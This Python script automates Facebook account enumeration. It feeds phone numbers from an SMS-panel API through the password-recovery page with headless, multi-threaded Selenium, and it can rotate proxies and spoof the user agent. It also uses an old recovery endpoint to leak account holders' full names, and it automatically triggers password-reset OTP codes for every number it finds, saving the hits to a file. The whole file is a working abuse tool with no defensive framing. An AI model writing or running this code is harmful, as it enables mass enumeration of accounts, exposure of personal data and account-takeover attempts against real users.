import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import time
import threading
import queue
from bs4 import BeautifulSoup
import re
import sys

# Configuration
SMS_PANEL_API_URL = "YOUR_SMS_PANEL_API_URL"  # e.g., 'https://your-sms-panel.com/api/balance' or list endpoint
SMS_PANEL_USERNAME = "your_username"
SMS_PANEL_PASSWORD = "your_password"
NUM_THREADS = 5  # Adjust based on rate limiting tolerance
PROXY_LIST = []  # Optional: ['http://proxy1:port', ...] for rotation

class FacebookPhoneChecker:
    def __init__(self, proxy=None):
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        if proxy:
            chrome_options.add_argument(f'--proxy-server={proxy}')
        self.driver = webdriver.Chrome(options=chrome_options)

    def check_phone(self, phone):
        """Check if phone has Facebook account using forgot password flow timing/leak (inspired by albararamli repo)."""
        try:
            self.driver.get('https://www.facebook.com/login/identify/')
            wait = WebDriverWait(self.driver, 10)
            input_field = wait.until(EC.presence_of_element_located((By.ID, 'email')))
            input_field.clear()
            input_field.send_keys(phone)
            search_btn = self.driver.find_element(By.NAME, 'did_submit')
            search_btn.click()
            time.sleep(3)  # Wait for response
            # Check for indicators: profile pic/name leak or specific error
            page_source = self.driver.page_source
            if 'find your account' in page_source.lower() or 'profile' in page_source.lower():
                return True
            # Alternative: old API leak for name (adapted from PaulSec)
            if self._check_old_api(phone):
                return True
            return False
        except Exception:
            return False

    def _check_old_api(self, identifier):
        """Fallback old reset API check for name leak (works if privacy not set)."""
        s = requests.Session()
        req = s.get('https://www.facebook.com/login/identify?ctx=recover&lwv=110')
        token_match = re.search(r'"token":"([a-zA-Z0-9_-]+)"', req.text)
        if not token_match:
            return False
        token = token_match.group(1)
        jsdatr_match = re.search(r'"_js_datr","([a-zA-Z0-9_-]+)"', req.text)
        if not jsdatr_match:
            return False
        jsdatr = jsdatr_match.group(1)
        data = {'lsd': token, 'email': identifier, 'did_submit': 'Search', '__user': 0, '__a': 1}
        cookies = {'_js_datr': jsdatr}
        headers = {'referer': 'https://www.facebook.com/login/identify?ctx=recover&lwv=110'}
        resp = s.post('https://www.facebook.com/ajax/login/help/identify.php?ctx=recover', cookies=cookies, data=data, headers=headers)
        ldata_match = re.search(r'ldata=([a-zA-Z0-9-_]+)\\"', resp.text)
        if ldata_match:
            init_resp = s.get(f'https://www.facebook.com/recover/initiate?ldata={ldata_match.group(1)}')
            soup = BeautifulSoup(init_resp.text, 'html.parser')
            full_name = soup.find('div', class_='fsl fwb fcb')
            return bool(full_name)
        return False

    def trigger_otp(self, phone):
        """Trigger password reset OTP send to phone."""
        try:
            self.driver.get('https://www.facebook.com/login/identify/')
            wait = WebDriverWait(self.driver, 10)
            input_field = wait.until(EC.presence_of_element_located((By.ID, 'email')))
            input_field.send_keys(phone)
            search_btn = self.driver.find_element(By.NAME, 'did_submit')
            search_btn.click()
            time.sleep(2)
            # Click "Search" leads to continue/reset options; select SMS reset
            continue_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//a[contains(text(), 'Continue') or contains(text(), 'No longer have access')]")))
            continue_btn.click()
            # Select phone option and confirm send code
            phone_option = WebDriverWait(self.driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//input[@value='phone']")))
            phone_option.click()
            send_code_btn = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Send Code')]")
            send_code_btn.click()
            print(f"OTP triggered for {phone}")
            return True
        except Exception as e:
            print(f"Error triggering OTP for {phone}: {e}")
            return False

    def close(self):
        self.driver.quit()

def get_numbers_from_sms_panel():
    """Fetch number list from your SMS panel API. Adapt to your panel's API."""
    # Example for common SMS panels like smspva or similar; replace with yours
    auth = requests.auth.HTTPBasicAuth(SMS_PANEL_USERNAME, SMS_PANEL_PASSWORD)
    resp = requests.get(SMS_PANEL_API_URL + '/get_numbers?service=fb', auth=auth)  # Assume endpoint for available FB numbers
    if resp.status_code == 200:
        return [num['phone'] for num in resp.json().get('numbers', [])]
    else:
        print("Error fetching numbers:", resp.text)
        return []  # Or load from file: open('numbers.txt').read().splitlines()

def worker(phone_queue, result_queue):
    proxy = PROXY_LIST.pop(0) if PROXY_LIST else None
    checker = FacebookPhoneChecker(proxy)
    while True:
        phone = phone_queue.get()
        if phone is None:
            break
        if checker.check_phone(phone):
            print(f"Valid FB ID found: {phone}")
            checker.trigger_otp(phone)  # Auto-trigger OTP
            result_queue.put(phone)
        phone_queue.task_done()
    checker.close()

if __name__ == "__main__":
    numbers = get_numbers_from_sms_panel()
    if not numbers:
        print("No numbers loaded. Provide SMS panel details or use numbers.txt")
        sys.exit(1)

    phone_queue = queue.Queue()
    result_queue = queue.Queue()

    for num in numbers:
        phone_queue.put(num)

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(phone_queue, result_queue))
        t.start()
        threads.append(t)

    phone_queue.join()

    # Signal threads to exit
    for _ in range(NUM_THREADS):
        phone_queue.put(None)
    for t in threads:
        t.join()

    # Save results
    valid_ids = []
    while not result_queue.empty():
        valid_ids.append(result_queue.get())
    with open('valid_fb_numbers.txt', 'w') as f:
        f.write('\n'.join(valid_ids))
    print(f"Found {len(valid_ids)} valid FB numbers with OTP triggered. Saved to valid_fb_numbers.txt")
